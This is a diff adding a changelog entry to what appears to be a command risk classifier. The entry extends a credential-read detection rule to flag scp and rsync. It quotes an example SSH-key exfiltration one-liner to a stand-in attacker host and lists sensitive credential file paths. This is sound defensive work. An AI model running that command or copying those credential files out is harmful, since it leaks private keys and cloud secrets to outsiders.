@@ -4,6 +4,39 @@
 
 (no entries — next release window)
 
+## [1.10.132] - 2026-05-03
+
+**`credential-read` extended to scp / rsync.** The existing
+tool list (`cat`, `less`, `more`, `head`, `tail`, `cp`, `mv`,
+`tar`, `gzip`, `base64`, `hexdump`, `xxd`) covered local reads
+and copies, but `scp` and `rsync` (which transfer the file to
+a remote host) silently slipped through. `scp ~/.ssh/id_rsa
+attacker@host:/keys/` is the canonical SSH-key-exfil one-liner
+— now flagged HIGH alongside the equivalent `cat ~/.ssh/id_rsa`.
+
+### Changed
+- **`credential-read`** tool list expanded with `scp` and
+  `rsync`. Same credential file paths as before:
+  - `/etc/shadow` / `/etc/gshadow`
+  - `~/.ssh/id_{rsa,ecdsa,ed25519,dsa}` (private keys)
+  - `~/.aws/{credentials,config}`
+  - `~/.kube/config`
+  - `~/.docker/config.json`
+  - `~/.npmrc`, `~/.netrc`, `~/.pypirc`
+
+### Added
+- **`tests/risk-classifier.test.js`**: 2 new `it()` cases —
+  scp/rsync of credential paths (5 attack shells) + regression
+  for scp/rsync of non-credential files (6 cases). Suite stays
+  at 175. Risk-classifier file 218 → 220 cases.
+
+### Why credential-read instead of new rule?
+The threat is identical: exposing the credential. The tool is
+just the sink. Rather than defining `credential-exfil` as a
+separate rule with its own regex, extending the tool list keeps
+the audit trail aligned (one reason code, one snippet,
+recognizable across forms).
+
 ## [1.10.131] - 2026-05-03
 
 **Three more catalog patterns**: `sed-system-file-edit` (high),
